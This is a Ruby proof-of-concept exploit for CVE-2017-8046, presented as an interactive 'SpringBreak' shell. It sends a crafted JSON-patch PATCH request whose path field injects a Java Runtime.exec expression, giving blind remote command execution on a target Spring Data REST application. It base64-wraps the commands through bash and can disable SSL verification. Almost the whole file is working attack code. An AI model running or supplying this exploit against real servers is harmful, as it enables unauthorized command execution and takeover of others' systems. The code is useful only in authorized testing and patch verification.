#!/usr/bin/env ruby

require 'net/http'
require 'base64'
require 'uri'

puts " _______  _______  _______ _________ _        _______  ______   _______  _______  _______  _\n"\
     "(  ____ \\(  ____ )(  ____ )\\__   __/( (    /|(  ____ \\(  ___ \\ (  ____ )(  ____ \\(  ___  )| \\    /\\ \n"\
     "| (    \\/| (    )|| (    )|   ) (   |  \\  ( || (    \\/| (   ) )| (    )|| (    \\/| (   ) ||  \\  / /\n"\
     "| (_____ | (____)|| (____)|   | |   |   \\ | || |      | (__/ / | (____)|| (__    | (___) ||  (_/ / \n"\
     "(_____  )|  _____)|     __)   | |   | (\\ \\) || | ____ |  __ (  |     __)|  __)   |  ___  ||   _ (  \n"\
     "      ) || (      | (\\ (      | |   | | \\   || | \\_  )| (  \\ \\ | (\\ (   | (      | (   ) ||  ( \\ \\ \n"\
     "/\\____) || )      | ) \\ \\_____) (___| )  \\  || (___) || )___) )| ) \\ \\__| (____/\\| )   ( ||  /  \\ \ \n"\
     "\\_______)|/       |/   \\__/\\_______/|/    )_)(_______)|/ \\___/ |/   \\__/(_______/|/     \\||_/    \\/\n"

puts "\nPoC for CVE-2017-8046. Available commands:\n  target <https://host/app/path>\n  "\
     "exec <command to execute on target>\n  base64 <on|off> (Toggles base64 encoding "\
     "of commands (uses bash), default: on)\n  verify <on|off> (Toggles SSL verification, default: on)\n  exit\n"\
     'Note: This is blind RCE, commands executed will not return output.'

b64    = 'on'
cmd    = ''
target = ''
verify = 'on'

def spl0it(target:, verify:, exe:)
  if target.empty?
    puts ' [!] You need to set a target first.'
    return
  end
  print ' [>] Sending command...'
  begin
    target = URI.parse(target)
    cmd = "[{ \"op\": \"replace\", \"path\": \"T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{#{exe}}))/foo\", \"value\": \"bar\" }]"
    req = Net::HTTP::Patch.new(target, 'User-Agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0')
    req.add_field('Content-Type', 'application/json-patch+json')
    http = Net::HTTP.new(target.host, target.port)
    http.use_ssl = true if target.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE if verify == 'off'
    resp = http.start { |h| h.request req, cmd }
  rescue => e
    puts "\n [!] Error: #{e.message}"
  end
  return unless e.nil?
  puts ' sent!'
  puts " [+] Received HTTP Status #{resp.code}: #{resp.msg}"
end

until cmd =~ /exit/i
  print "\nSpringBreak> "
  cmd = gets.strip

  if cmd =~ /^target/i
    _, t = cmd.split(' ')
    if t =~ URI.regexp
      target = t
      puts " [+] Target set to #{target}"
    else
      puts " [!] Invalid URI: #{t}"
    end

  elsif cmd =~ /^exec/i
    cmd.sub!(/^exec\s*/, '')
    if cmd.empty?
      puts ' [!] No command specified.'
    else
      enc = Base64.encode64(cmd).strip unless b64 == 'off'
      cmd = "bash -c {echo,#{enc}}|{base64,-d}|{bash,-i}" unless b64 == 'off'
      exe = cmd.split('').map(&:ord).join(',').to_s
      spl0it(target: target, verify: verify, exe: exe)
    end

  elsif cmd =~ /^base64/i
    _, action = cmd.split(' ')
    if action =~ /off/i
      b64 = 'off'
      puts ' [+] Base64 encoding disabled.'
    elsif action =~ /on/i
      b64 = 'on'
      puts ' [+] Base64 encoding enabled.'
    else
      puts ' [!] Invalid option.'
    end

  elsif cmd =~ /^verify/i
    _, action = cmd.split(' ')
    if action =~ /off/i
      verify = 'off'
      puts ' [+] SSL verification disabled.'
    elsif action =~ /on/i
      verify = 'on'
      puts ' [+] SSL verification enabled.'
    else
      puts ' [!] Invalid option.'
    end

  elsif cmd =~ /^exit$/i
    exit

  else
    puts " [?] Unknown command: #{cmd}"
  end
end
